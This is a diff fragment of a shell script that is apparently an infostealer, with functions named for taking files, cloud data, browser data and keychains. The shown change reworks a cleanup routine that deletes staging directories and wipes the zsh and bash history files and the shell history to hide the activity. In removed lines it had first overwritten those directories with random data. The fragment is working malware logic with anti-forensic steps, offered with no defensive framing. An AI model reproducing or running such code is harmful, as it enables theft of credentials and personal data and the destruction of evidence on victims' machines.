@@ -164,17 +164,11 @@ exfiltrate() {
 
 cleanup() {
   # Overwrite files before deletion
-  if [ -d "$hidden_dir" ]; then
-    find "$hidden_dir" -type f -exec bash -c 'for i in {1..3}; do dd if=/dev/urandom of="{}" bs=1M count=1 &> /dev/null; done' \;
     rm -rf "$hidden_dir"
-  fi
-
-  if [ -d "$stor_dir" ]; then
-    find "$stor_dir" -type f -exec bash -c 'for i in {1..3}; do dd if=/dev/urandom of="{}" bs=1M count=1 &> /dev/null; done' \;
     rm -rf "$stor_dir"
-  fi
-  echo > ~/.zsh_history
-  history -c 
+    echo > ~/.zsh_history
+    echo > ~/.bash_history
+    history -c 
 }
 
 exfil_files &
@@ -189,9 +183,8 @@ exfil_keychains
 
 wait $exfil_files_pid $exfil_cloud_pid $exfil_browsers_pid
 exfil_compress & 
-disown
 
-
+#wait $compress_pid
 # exfiltrate &
 
 #wait $exfiltrate_pid
